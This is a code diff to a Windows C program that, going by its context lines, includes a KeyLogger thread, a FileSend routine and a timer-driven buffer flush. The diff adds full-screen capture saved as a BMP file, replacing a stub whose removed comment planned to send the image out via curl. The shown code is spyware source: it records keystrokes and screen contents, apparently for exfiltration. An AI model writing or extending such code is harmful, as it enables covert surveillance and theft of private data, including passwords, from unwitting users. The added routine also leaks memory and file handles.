@@ -8,17 +8,164 @@ unsigned int bufferIndex = 0;
 unsigned int bufferSize = BUFFERLEN;
 HANDLE mutex;
 
-void ScreenCapture(int width, int height)
-{
+// Helper function to retrieve current position of file pointer:
+inline int GetFilePointer(HANDLE FileHandle){
+    return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
+    }
+//---------------------------------------------------------------------------
+
+// Screenshot
+//    -> FileName: Name of file to save screenshot to
+//    -> lpDDS: DirectDraw surface to capture
+//    <- Result: Success
+//
+BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height){
+    BOOL Success=FALSE;
+    HDC SurfDC=NULL;        // GDI-compatible device context for the surface
+    HBITMAP OffscrBmp=NULL; // bitmap that is converted to a DIB
+    HDC OffscrDC=NULL;      // offscreen DC that we can select OffscrBmp into
+    LPBITMAPINFO lpbi=NULL; // bitmap format info; used by GetDIBits
+    LPVOID lpvBits=NULL;    // pointer to bitmap bits array
+    HANDLE BmpFile=INVALID_HANDLE_VALUE;    // destination .bmp file
+    BITMAPFILEHEADER bmfh;  // .bmp file header
+
+    // We need an HBITMAP to convert it to a DIB:
+    if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
+        return FALSE;
+
+    // The bitmap is empty, so let's copy the contents of the surface to it.
+    // For that we need to select it into a device context. We create one.
+    if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
+        return FALSE;
+
+    // Select OffscrBmp into OffscrDC:
+    HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
+
+    // Now we can copy the contents of the surface to the offscreen bitmap:
+    BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
+
+    // GetDIBits requires format info about the bitmap. We can have GetDIBits
+    // fill a structure with that info if we pass a NULL pointer for lpvBits:
+    // Reserve memory for bitmap info (BITMAPINFOHEADER + largest possible
+    // palette):
+   // if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL) 
+     //   return false;
+
+	lpbi = (LPBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD));
+
+    ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
+    lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    // Get info but first de-select OffscrBmp because GetDIBits requires it:
+    SelectObject(OffscrDC, OldBmp);
+    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
+        return FALSE;
+
+    // Reserve memory for bitmap bits:
+
+        
+        lpvBits = malloc(lpbi->bmiHeader.biSizeImage);
+
+    // Have GetDIBits convert OffscrBmp to a DIB (device-independent bitmap):
+    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
+        return FALSE;
+
+    // Create a file to save the DIB to:
+    if ((BmpFile = CreateFile(filename,
+                              GENERIC_WRITE,
+                              0, NULL,
+                              CREATE_ALWAYS,
+                              FILE_ATTRIBUTE_NORMAL,
+                              NULL)) == INVALID_HANDLE_VALUE)
+                              
+                              return FALSE;
+
+    DWORD Written;    // number of bytes written by WriteFile
+    
+    // Write a file header to the file:
+    bmfh.bfType = 19778;        // 'BM'
+    // bmfh.bfSize = ???        // we'll write that later
+    bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
+    // bmfh.bfOffBits = ???     // we'll write that later
+    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
+        return FALSE;
+
+    if (Written < sizeof(bmfh)) 
+        return FALSE; 
+
+    // Write BITMAPINFOHEADER to the file:
+    if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL)) 
+        return FALSE;
+    
+    if (Written < sizeof(BITMAPINFOHEADER)) 
+            return FALSE;
+
+    // Calculate size of palette:
+    int PalEntries;
+    // 16-bit or 32-bit bitmaps require bit masks:
+    if (lpbi->bmiHeader.biCompression == BI_BITFIELDS) 
+        PalEntries = 3;
+    else
+        // bitmap is palettized?
+        PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
+            // 2^biBitCount palette entries max.:
+            (int)(1 << lpbi->bmiHeader.biBitCount)
+        // bitmap is TrueColor -> no palette:
+        : 0;
+    // If biClrUsed use only biClrUsed palette entries:
+    if(lpbi->bmiHeader.biClrUsed) 
+        PalEntries = lpbi->bmiHeader.biClrUsed;
+
+    // Write palette to the file:
+    if(PalEntries){
+        if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL)) 
+            return FALSE;
+
+        if (Written < PalEntries * sizeof(RGBQUAD)) 
+            return FALSE;
+        }
+
+    // The current position in the file (at the beginning of the bitmap bits)
+    // will be saved to the BITMAPFILEHEADER:
+    bmfh.bfOffBits = GetFilePointer(BmpFile);
+
+    // Write bitmap bits to the file:
+    if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL)) 
+        return FALSE;
+    
+    if (Written < lpbi->bmiHeader.biSizeImage) 
+        return FALSE;
+
+    // The current pos. in the file is the final file size and will be saved:
+    bmfh.bfSize = GetFilePointer(BmpFile);
+
+    // We have all the info for the file header. Save the updated version:
+    SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
+    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
+        return FALSE;
+
+    if (Written < sizeof(bmfh)) 
+        return FALSE;
+
+    return TRUE;
+    }
+    
+
+
+BOOL ScreenCapture(char *filename)
+{	
 	HDC hDc = CreateCompatibleDC(0);
+	int width = GetDeviceCaps(hDc, HORZRES);
+	int height = GetDeviceCaps(hDc, VERTRES);
 	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
 	SelectObject(hDc, hBmp);
 	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
-	
-	// convertire in PNG e inviare via curl
-	
+	BOOL ret = SaveBMPFile(filename, hBmp, hDc, width, height);
 	DeleteObject(hBmp);
+	DeleteObject(hDc);
+	return ret;
 }
+
+
 
 int FileSend(char *data, int length)
 {
@@ -141,6 +288,9 @@ DWORD WINAPI KeyLogger()
 
 int main(void)
 {
+	ScreenCapture("test.bmp");
+	
+			
 	mutex = CreateMutex(NULL, FALSE, NULL);
 	
 	buffer = (char*)malloc(BUFFERLEN);
@@ -156,6 +306,7 @@ int main(void)
 	{
 		if(timer > 10)
 		{
+
 			// lock
 			WaitForSingleObject(mutex, INFINITE);
 			
